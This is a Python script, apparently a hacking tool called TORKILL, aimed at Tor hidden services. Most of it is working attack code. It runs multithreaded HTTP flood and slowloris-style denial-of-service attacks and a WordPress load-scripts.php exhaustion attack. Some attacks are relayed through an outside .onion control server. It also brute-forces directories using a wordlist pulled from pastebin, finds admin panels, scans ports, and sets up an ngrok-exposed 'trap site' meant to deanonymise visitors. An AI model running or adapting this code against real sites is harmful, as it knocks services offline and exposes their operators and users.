# -*- coding: utf-8 -*-

import threading, socks, time, random, socket, string, requests, sys, urllib2, re, argparse, paramiko, hashlib, base64, json, os
import subprocess as subp
from BeautifulSoup import *
from sockshandler import SocksiPyHandler
from colorama import init, Fore, Back, Style


print("""


████████╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     
╚══██╔══╝██╔═══██╗██╔══██╗██║ ██╔╝██║██║     ██║     
   ██║   ██║   ██║██████╔╝█████╔╝ ██║██║     ██║     
   ██║   ██║   ██║██╔══██╗██╔═██╗ ██║██║     ██║     
   ██║   ╚██████╔╝██║  ██║██║  ██╗██║███████╗███████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝  

        Connecting to the Tor...

  [+]███████████████████████████████[+]                                                     
  """)

print(Fore.GREEN + "  [+] " + Fore.WHITE + " Version 0.2")

print(Fore.WHITE + """
  {1}  Directory Brute  {2}  Wordpress DoS
  {3}  Admin Finder     {4}  SLowloris
  {5}  Nginx DoS        {6}  Link Grabber
  {7}  Port Scanner     {8}  Show HTTP Header
  {9}  Fingerprint      {10} Trap Site

  """)


host = 'http://ddosogyyqstchmnx.onion'

global proxies
proxies = { 'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050' }

global useragents
useragents = [ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)", "Opera/9.20 (Windows NT 6.0; U; en)", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)", "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0", "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)" ]

global referers
referers = [ "https://www.google.com.hk/#newwindow=1&q=", "http://www.usatoday.com/search/results?q=", "http://www.baidu.com/s?wd=", "http://engadget.search.aol.com/search?q=", 'http://www.usatoday.com/search/results?q=', 
'http://engadget.search.aol.com/search?q=', 'http://www.google.com/?q=', 'http://engadget.search.aol.com/search?q=', 'http://www.bing.com/search?q=', 'http://search.yahoo.com/search?p=', 'http://www.ask.com/web?q=', 
'http://boorow.com/Pages/site_br_aspx?query=', 'http://search.lycos.com/web/?q=', 'http://busca.uol.com.br/web/?q=', 'http://us.yhs4.search.yahoo.com/yhs/search?p=','http://www.dmoz.org/search/search?q=', 
'http://www.baidu.com.br/s?usm=1&rn=100&wd=', 'http://yandex.ru/yandsearch?text=', 'http://www.zhongsou.com/third?w=','http://hksearch.timway.com/search.php?query=', 'http://find.ezilon.com/search.php?q=', 
'http://www.sogou.com/web?query=', 'http://api.duckduckgo.com/html/?q=' ]

global headers
headers = { 'User-Agent': random.choice(useragents), 'Connection': 'keep-alive', 'Keep-Alive': str(random.choice(range(110,120))), 'Referer': random.choice(referers) }

global randstr
randstr = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.choice(range(50,100))))


def attack1(host, port):
    foo = ['GET', 'POST']
    http = random.choice(foo)
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
    s = socks.socksocket()
    try:
      s.connect((host, 80))
      s.send(http + " / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Connection: keep-alive\r\n"
             "Keep-Alive: 900\r\n"
             "Accept: text/html\r\n"
             "Referer: %s\r\n"
             "Content-Length: 10000\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
             (host, random.choice(useragents), random.choice(referers)+ str(randstr)))

      s.send("HEAD / HTTP/1.0\r\n"
             "Host: %s\r\n"
             "Connection: Close\r\n"
             "User-Agent:  %s\r\n"
             "Referer: %s\r\n"
             "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\r\n\r\n" %
             (host, random.choice(useragents), random.choice(referers) + str(randstr)))
      for i in range(0, 99):
        s.send(randstr)
    except:
        print('  Error')


def attack2(host1, port):
    try:
        response = requests.get(host1, headers=headers, proxies=proxies)
    except:
        print('  Error')

    opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", port, True))
    opener.addheaders = [('User-Agent', random.choice(useragents))]
    opener.addheaders = [('Cache-Control', 'no-cache')]
    opener.addheaders = [('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')]
    opener.addheaders = [('Referer', random.choice(referers) + str(randstr))]
    opener.addheaders = [('Keep-Alive', random.randint(110,120))]
    opener.addheaders = [('Connection', 'keep-alive')]
    opener.addheaders = [('Host',host1)]
#    sys.stdout.write('0\n')

def attack3(host, port):
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
  s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, 80))
  s.send(randstr)

def wordpress(host, count):
  path = '''/wp-admin/load-scripts.php?c=1&load[]=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,
  wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,
  scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,
  jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,
  jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,
  jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,
  jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,
  jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,
  jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,
  masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,
  json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,
  wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,
  password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,
  customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,
  customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,
  media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,
  admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,
  theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,
  nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9.1'''
  for i in range(0, count):
    requests.get(host + path, verify=False, stream=True, headers=headers, proxies=proxies)
  

def deanon():
  site = 'php/index.php'
  api = 'http://localhost:4040/api/tunnels'
  print('\n' + '[!]' + ' Starting Apache Server...')
  subp.check_output(['service', 'apache2', 'start'])
  print('\n' + '[+]' + ' Starting Ngrok...' + '\n')
  subp.Popen(['ngrok', 'http', '80'], stdin=subp.PIPE,stderr=subp.PIPE, stdout=subp.PIPE)
  time.sleep(10)
  r1 = requests.get(api)
  page = r1.content
  json1 = json.loads(page)
  for item in json1['tunnels']:
    if item['proto'] == 'https':
      print('[+]' +' Trap URL: '+ item['public_url'] + '/' + site + '/')


def checkdirec(direc):
    try :
        responce = requests.get(target + direc, headers=headers, proxies=proxies)
        if (responce.status_code == 200):
            code = 200
            print(Fore.GREEN + '  Directory ' + direc + ' found')
        else:
            code = 0
            print(Fore.WHITE + '  Directory ' + direc + ' not found')
    except:
        print(Fore.WHITE + '  Directory ' + direc + ' not found')


def linkgrab(target):
  html_page = requests.get(target, proxies=proxies).text
  soup = BeautifulSoup(html_page)
  for link in soup.findAll('a'):
    print('  ' + link.get('href'))


def pscan(target1, i, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
  s = socks.socksocket()
  try:
    con = s.connect((target1, i))
    print(Fore.GREEN + '  ' + str(i)) + ' -> open' 
  except:
    print(Fore.WHITE + '  ' + str(i)) + ' -> close'


def fingerprint(target1, port):
  try:
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
    mySocket = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.connect((target1, 22))
  except:
    print(Fore.WHITE + "Error opening socket")
    exit()

  try:
    myTransport = paramiko.Transport(mySocket)
    myTransport.start_client()
    sshKey = myTransport.get_remote_server_key()
  except:
    print(Fore.WHITE + "SSH error")
    exit()
  myTransport.close()
  mySocket.close()
  printableType = sshKey.get_name()
  printableKey = base64.encodestring(sshKey.__str__()).replace('\n', '')
  sshFingerprint = hashlib.md5(sshKey.__str__()).hexdigest()
  printableFingerprint = ':'.join(a+b for a,b in zip(sshFingerprint[::2], sshFingerprint[1::2]))
  print "HostKey Type: %s, Key: %s (Fingerprint: %s)" %(printableType, printableKey, printableFingerprint)


def threads(type, num, args1, args2):
  threads = []
  for n in range(int(num)):
    t1 = threading.Thread(target=type,  args=(args1, args2))
    t1.daemon = True
    t1.start()
    threads.append(t1)


def usage():
  print("""
  usage: 
    DoS: python tor.py -u http://target.onion/ -t 100 or -c 100
    Wordpress/nginx/slowloris/: python tor.py -u http://target.onion/ -t 100 -a {} -c 100
    """)
  exit()


parser = argparse.ArgumentParser()
parser.add_argument("-a", help="Type attack")
parser.add_argument("-u", help="Target")
parser.add_argument("-t", default=10, help="Thread")
parser.add_argument("-c", default=50, help="Count")

args = parser.parse_args()

target = args.u
thread = args.t
attack = args.a
count  = args.c


if(target == None):
  usage()

if target[-1] == '/':
  target1 = target[7:-1]
else:
  target1 = target[7:]

data = requests.get(host + '?host=' + target1, headers=headers, proxies=proxies).text
responce = requests.get(target, headers=headers, proxies=proxies)

exitnode = re.findall(r'<ip>(.*?)</ip>', data, re.DOTALL)

exitnode = ''.join(exitnode)

print(Fore.GREEN + '  Server: ' + responce.headers.get('Server'))
print(Fore.GREEN + '  Exit node: ' +  exitnode + '\n')

if(attack == '1'):
  data = requests.get('http://pastebin.com/raw/QwjrgKj2', headers=headers, proxies=proxies).text
  for x in re.split(r'\s+', data):
    checkdirec(x)
elif(attack == '2'):
  threads(wordpress, thread, target, count)
  exit()
elif(attack == '3'):
  data = requests.get(host + '?find&host=' + target1, headers=headers, proxies=proxies).text
  admin = re.findall(r'<admin>(.*?)</admin>', data, re.DOTALL)
  print(Fore.GREEN + '  Admin panel: ' + admin + '\n')
  exit()
elif(attack == '4'):
  data = requests.get(host + '?slowloris&host=' + target +'&req=' + count, headers=headers, proxies=proxies)
  print(Fore.WHITE + '  Start attack slowloris')
  exit()
elif(attack == '5'):
  data = requests.get(host + '?nginx&host=' + target +'&req=' + count, headers=headers, proxies=proxies)
  print(Fore.WHITE + '  Start attack nginx')
  exit()
elif(attack == '6'):
  linkgrab(target)
  exit()
elif(attack == '7'):
  ports = [25, 22, 80, 21, 22, 23, 53, 443, 110, 1433, 3306]
  for i in ports:
    pscan(target1, i, 9050)  
    exit()
elif(attack == '8'):
  data = requests.get(host + '?head&host=' + target, headers=headers, proxies=proxies).text
  head = re.findall(r'<header>(.*?)</header>', data, re.DOTALL)
  for x in head: print(Fore.GREEN + x)
  exit()
elif(attack == '9'):
  fingerprint(target1, 9050)
  exit()
elif(attack == '10'):
  deanon()
  exit()

print(Fore.WHITE + '  Start DoS')


threads = []
for n in range(int(thread)):
    t1 = threading.Thread(target=attack1, args=(target1, 9050))
    t2 = threading.Thread(target=attack2, args=(target, 9050))
    t3 = threading.Thread(target=attack3, args=(target1, 9050))


    t1.daemon = True
    t2.daemon = True
    t3.daemon = True

    t1.start()
    t2.start()
    t3.start()

    threads.append(t1)
    threads.append(t2)
    threads.append(t3)


try:
  while 1:
    time.sleep(2)
    pass
except KeyboardInterrupt:
  print(Fore.WHITE + '  \nDone')
